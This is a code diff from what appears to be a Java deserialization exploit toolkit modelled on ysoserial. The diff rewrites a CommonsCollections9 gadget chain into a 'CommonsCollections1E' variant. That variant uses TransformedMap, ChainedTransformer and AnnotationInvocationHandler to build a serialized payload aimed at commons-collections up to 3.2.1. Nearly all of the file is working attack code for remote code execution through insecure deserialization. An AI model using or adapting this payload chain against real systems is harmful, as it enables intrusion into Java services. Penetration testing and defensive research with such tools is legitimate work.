@@ -1,4 +1,4 @@
-package com.ppp.chain.collections3;
+package com.ppp.chain.commonscollections3;
 
 import com.ppp.KickOff;
 import com.ppp.ObjectPayload;
@@ -12,22 +12,22 @@ import com.ppp.utils.Reflections;
 import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ChainedTransformer;
 import org.apache.commons.collections.functors.ConstantTransformer;
-import org.apache.commons.collections.keyvalue.TiedMapEntry;
-import org.apache.commons.collections.map.DefaultedMap;
+import org.apache.commons.collections.map.TransformedMap;
 
+import java.lang.annotation.Target;
 import java.util.HashMap;
 import java.util.Map;
 
 /**
  * @author Whoopsunix
  */
-@Dependencies({"commons-collections:commons-collections:>=3.2"})
-@Authors({Authors.MEIZJM3I})
+@Dependencies({"commons-collections:commons-collections:<=3.2.1"})
+@Authors({Authors.MATTHIASKAISER})
 @Sink({Sink.InvokerTransformer3})
-public class CommonsCollections9 implements ObjectPayload<Object> {
+public class CommonsCollections1E implements ObjectPayload<Object> {
 
     public static void main(String[] args) throws Exception {
-        PayloadRunner.run(CommonsCollections9.class, args);
+        PayloadRunner.run(CommonsCollections1E.class, args);
     }
 
     public Object getObject(SinksHelper sinksHelper) throws Exception {
@@ -43,13 +43,16 @@ public class CommonsCollections9 implements ObjectPayload<Object> {
         final Transformer transformerChain = new ChainedTransformer(
                 new Transformer[]{new ConstantTransformer(1)});
 
-        Map<Object, Object> innerMap = new HashMap<Object, Object>();
-        Map defaultedmap = DefaultedMap.decorate(innerMap, transformerChain);
-        TiedMapEntry entry = new TiedMapEntry(defaultedmap, "x");
+        HashMap map = new HashMap();
+        map.put("value", "value");
 
-        Object val = KickOff.badAttributeValueExpException(entry);
+        Map<Object, Object> transMap = TransformedMap.decorate(map, null, transformerChain);
+//        Map<Object, Object> transMap = (Map<Object, Object>) Reflections.getFirstCtor("org.apache.commons.collections.map.TransformedMap").newInstance(map, null, transformerChain);
+
+        Object annotationInvocationHandler = KickOff.annotationInvocationHandler(transMap, Target.class);
+        // 即 ChainedTransformer 的 Transformer[]
         Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
 
-        return val;
+        return annotationInvocationHandler;
     }
 }
